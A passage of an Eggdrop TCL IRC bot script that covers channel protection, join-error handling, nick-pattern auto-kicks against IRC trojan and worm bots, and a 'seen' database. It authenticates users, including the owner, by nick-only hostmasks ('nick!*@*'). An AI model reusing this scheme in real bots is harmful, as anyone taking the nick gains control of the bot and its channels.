    if {$opnick == $notb} { if {![info exists igflood($nick)]} { putserv "KICK $channel $nick :1dont de@p 2$notb" } ; opq $channel $opnick ; return 0 }
  }
}
proc unallowed {chan nick opnick} {
  if {![botisop $chan]} { return 0 }
  if {![isop $nick $chan]} { return 0 }
  if {[isop $opnick $chan]} { return 0 }
  putserv "mode $chan -ko 6chanserv.unallowed $nick"
}
bind nick - * chk_nicks
proc chk_nicks {unick uhost hand chan newnick} {
  global notc bannick botnick nick
  if {$unick == $nick && $unick != $botnick} { putsrv "NICK $nick" }
  if {[matchattr $unick Q]} {
    chattr $unick -Q
    foreach x [getuser $unick HOSTS] { delhost $unick $x }
    set hostmask "${unick}!*@*"
    setuser $unick HOSTS $hostmask
    saveuser
  }
  if {![isop $botnick $chan]} { return 0 }
  if {[isutimer "deopprc*$unick"]} { foreach x [utimers] { if {[string match "*deopprc*$unick*" $x]} { putlog "!UnDeOp $chan!" ; catch { killutimer [lindex $x 2] } } } }
  if {[string match "Guest*" $newnick]} { 
    if {[matchattr $unick f]} { return 0 }
    if {[isop $newnick $chan]} { utimer 1 [list deopprc $chan $newnick] ; return 0 }
  }
  if {[matchattr $newnick O] && [isop $newnick $chan]} { if {![string match "*k*" [getchanmode $chan]]} { putserv "mode $chan -ko 6no@p.list $newnick" } { putserv "mode $chan -o $newnick" } }
  akick_chk $newnick $uhost $chan
  if {[string match "*+greet*" [channel info $chan]]} { badnick_chk $newnick $uhost $hand $chan }
  if {([string match "*\}*" $newnick] || [string match "*\{*" $newnick]) && ([string length $newnick] == 8) && (![string match "*V{A}LNet*" $nick])} { 
    set bannick($newnick) "$uhost" ; putserv "kick $chan $newnick :ERRnick 2possible 1flooder"
  }
  return 0
}
bind raw - 305 not_away
proc not_away {from keyword arg} { if {[isutimer "del_nobase"]} { utimer 1 del_nobase } ; if {[isutimer "goback"]} { utimer 2 goback } ; unsetignore "*!*@*" }
bind raw - 432 nickERROR
proc nickERROR {from keyword arg} { global nick ; set nick "ERR[unixtime]" }
bind raw - 404 ch_moderate
proc ch_moderate {from keyword arg} {
  putlog "CANT SEND ON MODERaTE!"
  if {[isutimer "del_nobase"]} { catch { clearqueue all } ; foreach x [utimers] { if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase } } }
}
bind raw - 473 ch_invite
proc ch_invite {from keyword arg} {
  global double joinme notc 
  set chan [lindex $arg 1]
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$chan 4(+I)" }
    putsrv "ChanServ invite $chan" ; set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :ReMOVE $chan 4(+I)" }
      channel remove $chan ; savechan
    }
    set joinme "" ; set double 0
  }
  return
}
bind raw - 474 ch_banned
proc ch_banned {from keyword arg} {
  global double joinme notc 
  set chan [lindex $arg 1]
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$chan 4(+B)" }
    putsrv "ChanServ invite $chan" ; puthlp "ChanServ unban $chan"
    set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :ReMovE $chan 4(+B)" }
      putsrv "ChanServ invite $chan" ; channel remove $chan ; savechan
    }
    set joinme "" ; set double 0
  }
  return 0
}
bind raw - 475 ch_key
proc ch_key {from keyword arg} {
  global double joinme notc lastkey
  set chan [lindex $arg 1]
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$chan 4(+K)" }
    if {[matchattr $cflag K]} { puthlp "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]" } { puthlp "JOIN $chan" }
    if {[info exists lastkey]} { puthlp "JOIN $chan :$lastkey" }
    set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :ReMovE $chan 4(+K)" }
      channel remove $chan ; savechan ; return 0
    }
    if {[string tolower $chan]} { putsrv "ChanServ invite $chan" }
    set joinme "" ; set double 0
  }
  return 0
}
bind raw - 478 ch_full
proc ch_full {from keyword arg} {
  global double joinme notc botnick
  set chan [lindex $arg 1]
  if {[isop $botnick $chan]} {
    set bans "" ; set i 0
    foreach x [chanbans $chan] { if {$i < 5} { append bans " [lindex $x 0]" ; set i [incr i] } }
    putserv "MODE $chan -kbbbbb 6ban.list.full $bans"
    return 0
  }
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$chan 4(+L)" }
    putsrv "ChanServ invite $chan" ; set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :ReMOVE $chan 4(+L)" }
      channel remove $chan ; savechan
    }
    set joinme "" ; set double 0
  }
  return 0
}
if {$altnick == ""} { set altnick [randstring 7] }
set badwords ""
set advwords ""
proc config {} {
  global nick nickpass altpass altnick realname owner kops my-ip banner awaybanner
  global notc notm logstore cfgfile badwords advwords ban-time my-hostname kickclr kcounter
  if {[validuser "config"]} {
    if {[getuser "config" XTRA "REALNAME"]!=""} { set realname [dezip [getuser "config" XTRA "REALNAME"]] } else { set realname }
    if {[getuser "config" XTRA "USERNAME"]!=""} { set realname [dezip [getuser "config" XTRA "USERNAME"]] }
    if {[getuser "config" XTRA "NICK"]!=""} { set nick [dezip [getuser "config" XTRA "NICK"]] }
    if {[getuser "config" XTRA "NICKPASS"]!=""} { set nickpass [dezip [getuser "config" XTRA "NICKPASS"]] }
    if {[getuser "config" XTRA "ALTNICK"]!=""} { set altnick [dezip [getuser "config" XTRA "ALTNICK"]] }
    if {[getuser "config" XTRA "ALTPASS"]!=""} { set altpass [dezip [getuser "config" XTRA "ALTPASS"]] }
    if {[getuser "config" XTRA "BAN"]!=""} { set notc [dezip [getuser "config" XTRA "BAN"]] }
	if {[getuser "config" XTRA "ODON"]!=""} { set awaybanner [dezip [getuser "config" XTRA "ODON"]] }
    if {[getuser "config" XTRA "BANTIME"]!=""} { set ban-time [getuser "config" XTRA "BANTIME"] }
    if {[getuser "config" XTRA "BADWORDS"]!=""} { set badwords [getuser "config" XTRA "BADWORDS"] }
    if {$badwords == ""} {
      set badwords ""
      setuser "config" XTRA "BADWORDS" $badwords
    }
    if {[getuser "config" XTRA "ADVWORDS"]!=""} { set advwords [getuser "config" XTRA "ADVWORDS"] }
    if {$advwords == ""} {
      set advwords ""
      setuser "config" XTRA "ADVWORDS" $advwords
    }
    if {[getuser "config" XTRA "KOPS"]!=""} { set kops "T" }
    if {[getuser "config" XTRA "KCLR"]!=""} { set kickclr "T" } 
    if {[getuser "config" XTRA "VHOST"]!=""} { set my-hostname [getuser "config" XTRA "VHOST"] ; set my-ip [getuser "config" XTRA "VHOST"] }
    if {[getuser "config" XTRA "LOGCHAN"]!=""} {
      putlog "CReaTING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
      set logstore "${cfgfile}.log"
      logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore 
    }
  } else { adduser "config" "" ; chattr "config" "-hp" }
  foreach x [userlist] { chattr $x -Q ; if {$x != "config" && $x != "AKICK"} { foreach y [getuser $x HOSTS] { delhost $x $y } ; set hostmask "${x}!*@*" ; setuser $x HOSTS $hostmask } }
  if {![validuser "AKICK"]} { set hostmask "telnet!*@*" ; adduser "AKICK" $hostmask ; chattr "AKICK" "-hp" ; chattr "AKICK" "K" }
  if {![validuser $owner]} { set hostmask "$owner!*@*" ; adduser $owner $hostmask ; chattr $owner "Zfhjmnoptx" }
  saveuser
}
utimer 1 {config}
utimer 2 {seen}
## public trojan auto kick -- start
bind pub Z `+trojan pub_+trojan
setudef flag trojan
proc pub_+trojan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*+trojan*" [channel info $chan]]} { puthelp "NOTICE $nick :$chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +trojan }
  puthelp "NOTICE $nick :trojan Nick Kick (@) & Report $chan \[9ON\]"
  saveuser
}
bind pub Z `-trojan pub_-trojan
proc pub_-trojan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*-trojan*" [channel info $chan]]} { puthelp "NOTICE $nick :trojan Nick Kick (@) & Report $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -trojan }
  puthelp "NOTICE $nick :trojan Nick Kick (@) & Report $chan \[4Off\]"
  saveuser
}
set banmasktro {
  "Aldora*" "Alysia*" "Amorita*" "Anita*" "April*" "Ara*" "Aretina*" "Barbra*" "Becky*" "Bella*" "Bettina*" "Blenda*" "Briana*" "Bridget*" "Caitlin*" "Camille*" "Cara*" "*Jolyanne*"
  "Carmen*" "Chelsea*" "Clarissa*" "Damita*" "Danielle*" "Daria*" "Diana*" "Donna*" "Dora*" "Doris*" "Ebony*" "Eden*" "Eliza*" "Emily*" "Erika*" "Eve*" "Zoe*" "Zenia*"
  "Evelyn*" "Faith*" "Fisher*" "Gale*" "Gilda*" "Gloria*" "grod0lf*" "Haley*" "Helga*" "Holly*" "Hunter*" "Ida*" "Idona*" "Iris*" "Iyana*" "Isabel*" "Ivana*" "Ivory*" "Carla*" "Clari*" "Zilya*" 
  "Janet*" "Jewel*" "Joanna*" "Julie*" "Juliet*" "Kacey*" "Kali*" "Kara*" "Kassia*" "Katrina*" "Kyle*" "Lara*" "Laura*" "Linda*" "Lisa*" "Lolita*" "Lynn*" "Maia*" 
  "Mary*" "Melody*" "Mimi*" "Myra*" "Nadia*" "Naomi*" "Natalie*" "Nicole*" "Nina*" "Nora*" "Nova*" "Olga*" "Olivia*" "Pamela*" "Peggy*" "Queen*" "Rachel*" "Rae*"
  "Rita*" "Rosa*" "Ruby*" "Sharon*" "Silver*" "Ula*" "Uma*" "Valda*" "Valora*" "Vanessa*" "Vicky*" "Violet*" "Vivian*" "Wendy*" "Willa*" "Xandra*" "Xenia*" "Xylia*"  
}
proc trojanchk {nick bmask_check bmask_host chan} {
  global banmasktro tjidx notc
  set nick1 [string index $nick [expr [string length $nick] -1]]
  set nick2 [string index $nick [expr [string length $nick] -2]]
  foreach bmask $banmasktro {
    if {[string index $bmask_check 0] == "~"} { putlog "worm halted" ; return 0 }
    if {[string match $bmask $bmask_check] && [isnumber $nick1] && [isnumber $nick2]} { if {[botisop $chan]} { if {$tjidx == 9} { set tjidx 1 } ; trojankick $nick $bmask_host $chan } }
} }
set tjidx 1
proc trojankick {nick bmask_host chan} {
  global tjidx notc bannick botnick
  set bannick($nick) "$bmask_host"
  if {$tjidx == 1} { putserv "KICK $chan $nick :1w324@1dref-d2/1trojan2/1ircworm detected"
    } elseif {$tjidx == 2} { putserv "KICK $chan $nick :1Email-Worm.4Win321.Drefir.f2/1trojan2/1ircworm detected"
    } elseif {$tjidx == 3} { putserv "KICK $chan $nick :1w324@1drefir.D2/1trojan2/1ircworm detected"
    } elseif {$tjidx == 4} { putserv "KICK $chan $nick :1w324@1drefir.E2/1trojan2/1ircworm detected"
    } elseif {$tjidx == 5} { putserv "KICK $chan $nick :1w324@1drefir.F2/1trojan2/1ircworm detected"
    } elseif {$tjidx == 6} { putserv "KICK $chan $nick :1you're infected with IRC trojan virus.."
    } elseif {$tjidx == 7} { putserv "KICK $chan $nick :1w324@1drefir.worm.gen2/1trojan2/1ircworm detected"
    } elseif {$tjidx == 8} { putserv "KICK $chan $nick :1w324@1drefir.f.worm2/1trojan2/1ircworm detected"
    } elseif {$tjidx == 9} { putserv "KICK $chan $nick :1drefir.4f2/1trojan2/1ircworm detected"
    set tjidx 0
  }
  incr tjidx
  return 0
}
## public trojan auto kick -- stop
## public echoX auto kick -- start
bind pub Z `+echox pub_+echox
setudef flag echox
proc pub_+echox {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*+echox*" [channel info $chan]]} { puthelp "NOTICE $nick :$chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +echox }
  puthelp "NOTICE $nick :echoX Nick Kick $chan \[9ON\]"
  saveuser
}
bind pub Z `-echox pub_-echox
proc pub_-echox {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*-echox*" [channel info $chan]]} { puthelp "NOTICE $nick :echoX Nick Kick $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -echox }
  puthelp "NOTICE $nick :echoX Nick Kick $chan \[4Off\]"
  saveuser
}
set echonick {
"Aake" "aaren" "aarika" "abagael" "abagail" "abbey" "angelita" "angelle" "angelo" "angil" "angus" "angy" "ania" "anica" "anissa" "anita" "Anitra" "Sverre" "Swapna" "sybil" "sybila" "sybilla" "sybille" "sybyl" "syd" "sydel" "sydelle" "sydney" "sydney" "sylas" "sylvan" "sylvester" "Sylvia" "sylvia" "estrella" "estrellita" "Eswar" "ethel" "ethelbert" "ethelda" "ethelin" "ethelind" "etheline" "ethelred" "ethelyn" "ethyl" "etienne" "gaspard" "gasparo" "gasper" "gaston" "Gaszczyk" "gaultiero" "gauthier" "gav" "gavan" "gaven" "gavin" "gavra" "gavrielle" "gawain" "gawen" "harlie" "harlin" "harman" "harmon" "harmonia" "harmonie" "harmony" "harold" "haroun" "harp" "Harper" "hartman" "harper" "Harpreet" "cassandra" "izzy" "johnson" "julietta" "Juliette" "juliette" "julina" "juline" "julio" "julissa" "julita" "julius" "kylen" "kylie" "kylie" "kylila" "kylynn" "kynthia" "kyrstin" "Kyung-Sung" "lurette" "laverne" "lacee" 
}
set echoident {
"Aake" "aaren" "aarika" "abagael" "abagail" "abbey" "angelita" "angelle" "angelo" "angil" "angus" "angy" "ania" "anica" "anissa" "anita" "Anitra" "Sverre" "Swapna" "sybil" "sybila" "sybilla" "sybille" "sybyl" "syd" "sydel" "sydelle" "sydney" "sydney" "sylas" "sylvan" "sylvester" "Sylvia" "sylvia" "estrella" "estrellita" "Eswar" "ethel" "ethelbert" "ethelda" "ethelin" "ethelind" "etheline" "ethelred" "ethelyn" "ethyl" "etienne" "gaspard" "gasparo" "gasper" "gaston" "Gaszczyk" "gaultiero" "gauthier" "gav" "gavan" "gaven" "gavin" "gavra" "gavrielle" "gawain" "gawen" "harlie" "harlin" "harman" "harmon" "harmonia" "harmonie" "harmony" "harold" "haroun" "harp" "Harper" "hartman" "harper" "Harpreet" "cassandra" "izzy" "johnson" "julietta" "Juliette" "juliette" "julina" "juline" "julio" "julissa" "julita" "julius" "kylen" "kylie" "kylie" "kylila" "kylynn" "kynthia" "kyrstin" "Kyung-Sung" "lurette" "laverne" "lacee" 
}
proc echoxchk {nick uhost hand chan} {
  global echoident echonick notc bannick botnick lenc
  set echohost "[string trimleft [lindex [split $uhost @] 0] ~]"
  foreach echomask $echoident {
    if {[string match $echomask $echohost]} {
      if {[string match "*_*" $nick]} {
        set echoright "[lindex [split $nick _] 1]"
        foreach nick2 $echonick { if {[string match $nick2 $echoright]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :1i'm the anti 2echo4X1 inviter 2v2" } }
        } else {
        set nick3cut [string trimright $nick [string index $nick [expr [string length $nick] -1]]]
        foreach nick3 $echonick { if {[string match $nick3 $nick3cut]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :1i'm the anti 2echo4X1 inviter 2v1a" } }
        foreach nick4 $echonick { if {[string match $nick4 $nick]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :1i'm the anti 2echo4X1 inviter 2v1" } }
  } } }
  return 0
}
## public echoX auto kick -- stop
## active chatter -- start
bind pub n `+active pub_+active
setudef flag active
proc pub_+active {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*+active*" [channel info $chan]]} { puthelp "NOTICE $nick :$chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +active }
  puthelp "NOTICE $nick :+v active chatter on $chan \[9ON\]"
  saveuser
}
bind pub n `-active pub_-active
proc pub_-active {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*-active*" [channel info $chan]]} { puthelp "NOTICE $nick :+v active chatter on $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -active }
  puthelp "NOTICE $nick :+v active chatter on $chan \[4Off\]"
  saveuser
}
## active chatter -- stop
## split -- start
bind pub n `+split pub_+split
setudef flag split
proc pub_+split {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*+split*" [channel info $chan]]} { puthelp "NOTICE $nick :$chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +split }
  puthelp "NOTICE $nick :split detector on $chan \[9ON\]"
  saveuser
}
bind pub n `-split pub_-split
proc pub_-split {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[string match "*-split*" [channel info $chan]]} { puthelp "NOTICE $nick :split detector $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -split }
  puthelp "NOTICE $nick :split detector on $chan \[4Off\]"
  saveuser
}
## split -- stop
proc uncolor {s} {
  regsub -all --  $s "" s
  regsub -all --  $s "" s
  regsub -all --  $s "" s
  regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
  regsub -all -- \[0-9\],\[0-9\] $s "" s
  regsub -all -- \[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\] $s "" s
  return $s
}
proc netext {text} {
  	regsub -all -- "\003(\[0-9\]\[0-9\]?(,\[0-9\]\[0-9\]?)?)?" $text "" text
  	set text "[string map -nocase [list \002 "" \017 "" \026 "" \037 ""] $text]"
  	return $text
}
##################################
###        Seen Sytem           ##
##################################
set bs(limit) 7500
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(quiet_chan) ""
set bs(log_only) ""
set bs(flood) 2:10
set bs(ignore) 1
set bs(ignore_time) 1
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "text/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c
proc seen {} {
  global version notc notd
  catch { unbind time - "12 * * * *" bs_timedsave }
  catch { unbind time -  "*1 * * * *" bs_trim }
  catch { unbind join -|- * bs_join_botidle }
  catch { unbind join -|- * bs_join }
  catch { unbind sign -|- * bs_sign }
  catch { unbind kick -|- * bs_kick }
  catch { unbind nick -|- * bs_nick }
  catch { unbind splt -|- * bs_splt }
  catch { unbind rejn -|- * bs_rejn }
  catch { unbind chjn -|- * bs_chjn }
  catch { unbind chpt -|- * bs_chpt }
  catch { unbind bot -|- bs_botsearch bs_botsearch }
  catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
  catch { unbind pub -|- [string trim "!"]seen pub_seen }
  catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
  catch { unbind pub n|- [string trim "!"]seenstats bs_pubstats }
  catch { unbind msg n|- seenstats bs_msgstats }
  catch { unbind dcc n|- seenstats bs_dccstats }
  catch { unbind msgm -|- "help seen" bs_help_msg_seen }
  catch { unbind msgm n|- "help chanstats" bs_help_msg_chanstats }
  catch { unbind msgm n|- "help seenstats" bs_help_msg_seenstats }
  catch { unbind dcc -|- seenversion bs_version }
  catch { unbind dcc -|- help bs_help_dcc }
  catch { unbind dcc n|- chanstats bs_dccchanstats }
  catch { unbind pub n|- [string trim "!"]chanstats bs_pubchanstats }
  catch { unbind msg n|- chanstats bs_msgchanstats }
  catch { unbind pub -|- [string trim "!"]lastspoke lastspoke }
  catch { unbind part -|- * bs_part_oldver }
  catch { unbind chof -|- * bs_chof }
  set mSEEN "F"
  foreach x [channels] { set cinfo [channel info $x] ; if {[string match "*+seen*" $cinfo]} { set mSEEN "T" } }
  if {$mSEEN == "F"} {return 0}
  bind time - "12 * * * *" bs_timedsave
  bind time -  "*1 * * * *" bs_trim
  bind join -|- * bs_join_botidle
  bind join -|- * bs_join
  bind sign -|- * bs_sign
  bind kick -|- * bs_kick
  bind nick -|- * bs_nick
  bind splt -|- * bs_splt
  bind rejn -|- * bs_rejn
  bind chjn -|- * bs_chjn
  bind chpt -|- * bs_chpt
  bind bot -|- bs_botsearch bs_botsearch
  bind bot -|- bs_botsearch_reply bs_botsearch_reply
  bind pub -|- !seen pub_seen
  bind pub -|- lihat pub_seen2
  bind pub -|- liat pub_seen2
  bind pub -|- !seennick bs_pubreq2
  bind pub n|- [string trim "!"]seenstats bs_pubstats 
  bind msg n|- seenstats bs_msgstats 
  bind dcc n|- seenstats bs_dccstats 
  bind msgm -|- "help seen" bs_help_msg_seen 
  bind msgm n|- "help chanstats" bs_help_msg_chanstats 
  bind msgm n|- "help seenstats" bs_help_msg_seenstats 
  bind dcc -|- seenversion bs_version 
  bind dcc -|- seenseen bs_help_dcc 
  bind dcc n|- chanstats bs_dccchanstats 
  bind pub n|- [string trim "!"]chanstats bs_pubchanstats 
  bind msg n|- chanstats bs_msgchanstats 
  bind pub -|- [string trim "!"]lastspoke lastspoke 
  if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
  if {[string trimleft [lindex $version 1] 0] >= 1050000} { bind part -|- * bs_part } { if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part} ; bind part -|- * bs_part_oldver }
  foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
  if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
  if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
  if {[info exists bs_list]} { if {[info exists bs(oldver)]} { if {$bs(oldver) < $bs(updater)} {bs_update} } {bs_update} }
}
utimer 2 seen
proc bs_filt {data} {
  regsub -all -- \\\\ $data \\\\\\\\ data 
  regsub -all -- \\\[ $data \\\\\[ data 
  regsub -all -- \\\] $data \\\\\] data
  regsub -all -- \\\} $data \\\\\} data 
  regsub -all -- \\\{ $data \\\\\{ data 
  regsub -all -- \\\" $data \\\\\" data 
  return $data
}
proc bs_flood_init {} {
  global bs bs_flood_array 
  if {![string match *:* $bs(flood)]} {return}
  set bs(flood_num) [lindex [split $bs(flood) :] 0]
  set bs(flood_time) [lindex [split $bs(flood) :] 1]
  set i [expr $bs(flood_num) - 1]
  while {$i >= 0} { set bs_flood_array($i) 0  ; incr i -1  }
} 
bs_flood_init
proc bs_flood {nick uhost} {
  global bs bs_flood_array 
  if {[matchattr $nick m]} {return 0}
  if {$bs(flood_num) == 0} {return 0} 
  set i [expr $bs(flood_num) - 1]
  while {$i >= 1} { set bs_flood_array($i) $bs_flood_array([expr $i - 1]) ; incr i -1 } 
  set bs_flood_array(0) [unixtime]
  if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} { if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)} ; return 1 } {return 0}
}
proc bs_read {} {
  global bs_list userfile bs
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} { set temp [split $userfile /] ; set temp [lindex $temp [expr [llength $temp]-1]] ; set name [lindex [split $temp .] 0] }
  if {![file exists $bs(path)bs_data.$name]} { if {![file exists $bs(path)bs_data.$name.bak]} { putlog "Old seen data not found!" ; return } {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name ; putlog "Old seen data not found! Using backup data."} } ; set fd [open $bs(path)bs_data.$name r]
  set bsu_ver "" ; set break 0
  while {![eof $fd]} {
    set inp [gets $fd] ; if {[eof $fd]} {break} ; if {[string trim $inp " "] == ""} {continue}
    if {[string index $inp 0] == "#"} {set bsu_version [string trimleft $inp #] ; continue}
    if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
      putlog "Updating database to new version of bseen..."
      #bugfix (b) - loading the wrong updater version
      if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
      if {$temp || [bsu_go] || [bsu_finish]} {
        putlog "A serious problem was encountered while updating the bseen database."
        if {$temp} {putlog "     The updater script could not be found."}
        putlog "It is *not* safe to run the bot w/ a bseen database that is not matched to this version of bseen."
        putlog "If you can't find the problem, the only option is to remove the bs_data.$name and bs_data.$name.bak files.  Then restart the bot."
        putlog "Because this is a potential crash point in the bot, the bot will now halt." ; die "critical error in bseen encountered"
      } ; set break 1 ; break
    }
    set nick [lindex $inp 0] ; set bs_list([string tolower $nick]) $inp
  } ; close $fd
  if {$break} {bs_read} {putlog "     Done loading [array size bs_list] seen records."}
}
proc bs_update {} { global bs ; bs_save ; bs_read }
putlog "$bs(version):  -- Bass's SEEN loaded --"
if {![info exists bs_list] || [array size bs_list] == 0} {putlog "     Loading seen database..." ; bs_read}
proc bs_timedsave {min b c d e} {bs_save}
proc bs_save {} {
  global bs_list userfile bs ; if {[array size bs_list] == 0} {return}
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} { set temp [split $userfile /] ; set temp [lindex $temp [expr [llength $temp]-1]] ; set name [lindex [split $temp .] 0] }
  if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
  set fd [open $bs(path)bs_data.$name w] ; set id [array startsearch bs_list] ; putlog "Backing up seen data..."
  puts $fd "#$bs(updater)"
  while {[array anymore bs_list $id]} {set item [array nextelement bs_list $id] ; puts $fd "$bs_list($item)"} ; array donesearch bs_list $id ; close $fd
}
proc bs_part_oldver {a b c d} {bs_part $a $b $c $d ""}
proc bs_part {nick uhost hand chan reason} { bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]" }
proc bs_join {nick uhost hand chan} { bs_add $nick "[list $uhost] [unixtime] join $chan" }
proc bs_sign {nick uhost hand chan reason} { bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]" }
proc bs_kick {nick uhost hand chan knick reason} { set schan $chan ; bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]" }
proc bs_nick {nick uhost hand chan newnick} { set time [unixtime] ; bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]" ; bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]" }
proc bs_splt {nick uhost hand chan} { bs_add $nick "[list $uhost] [unixtime] splt $chan" }
proc bs_rejn {nick uhost hand chan} { bs_add $nick "[list $uhost] [unixtime] rejn $chan" }
proc bs_chjn {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
proc bs_chpt {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}
proc bs_botsearch {from cmd args} {
  global botnick notc
  set args [join $args]
  set command [lindex $args 0]
  set target [lindex $args 1]
  set nick [lindex $args 2]
  set search [bs_filt [join [lrange $args 3 e]]]
  if {[string match *\\\** $search]} {
    set output [bs_seenmask bot $nick $search]
    if {$output != "No matches were found." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
    } {
    set output [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
    if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
} }
proc bs_botsearch_reply {from cmd args} {
  global notc bs
  set args [join $args]
  if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
  if {![info exists bs(bot_delay)]} {
    set bs(bot_delay) on 
    utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}} 
    if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} { puthlp "[lindex $args 1] :[join [lindex $args 2]]" }
} }
proc pub_seen {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 0}
proc pub_seen2 {nick uhost hand chan args} {
 global botnick
 if {[string match "*[string tolower $botnick]*" $args] || [string match "* nit!*" $args] || [string match "* nit?*" $args] || [string match "* nit" $args] || [string match "* nit *" $args] || [string match "nit *" $args] || [string match "*niet*" $args] || [string match "* nita" $args] || [string match "nita *" $args] || [string match "* nita *" $args]} { bs_pubreq $nick $uhost $hand $chan $args 0 }
 return 0
}
proc bs_pubreq2 {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
proc bs_pubreq {nick uhost hand chan args no} {
  global botnick bs notc seenme
  set cflag "c$chan"
  if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  if {[bs_flood $nick $uhost]} {return 0}
  set i 0
  if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
  if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
  set args [bs_filt [join $args]]
  set target "privmsg $chan"
  if {[string match *\\\** [lindex $args 0]]} {
    set output [bs_seenmask $chan $hand $args]
